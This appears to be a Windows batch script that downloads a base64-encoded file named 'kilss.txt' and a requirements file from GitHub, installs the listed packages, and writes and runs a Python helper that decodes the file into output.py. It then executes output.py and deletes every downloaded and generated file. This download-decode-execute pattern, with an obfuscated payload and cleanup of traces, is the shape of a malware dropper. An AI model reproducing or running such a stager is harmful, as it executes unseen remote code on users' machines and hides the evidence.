@echo off

set "downloads_folder=%USERPROFILE%\Downloads"


set "activate_script=%downloads_folder%.\.venv\Scripts\activate"

cd /d "%downloads_folder%"

call "%activate_script%"

curl -o %USERPROFILE%\Downloads\kilss.txt https://raw.githubusercontent.com/zerot2Dev/devsc/main/kilss.txt

curl -o %USERPROFILE%\Downloads\requirements.txt https://raw.githubusercontent.com/zerot2Dev/zero_import/main/requirements.txt


pip install -r requirements.txt

del requirements.txt
set output_file=decoded_file.py


echo import os  >> %output_file%
echo import base64 >> %output_file%
echo input_file_path = os.path.join(os.getcwd(), "kilss.txt") >> %output_file%
echo with open(input_file_path, "r", encoding="utf-8") as file: >> %output_file%
echo     encoded_data = file.read() >> %output_file%
echo decoded_data = base64.b64decode(encoded_data) >> %output_file%
echo output_file_path = os.path.join(os.getcwd(), "output.py") >> %output_file%

echo with open(output_file_path, "w", encoding="utf-8") as output_file: >> %output_file%
echo     output_file.write(decoded_data.decode("utf-8")) >> %output_file%


if exist %output_file% (
    python %output_file%
    del %output_file%
)


if exist output.py (
    python output.py
    del output.py
    del kilss.txt

)
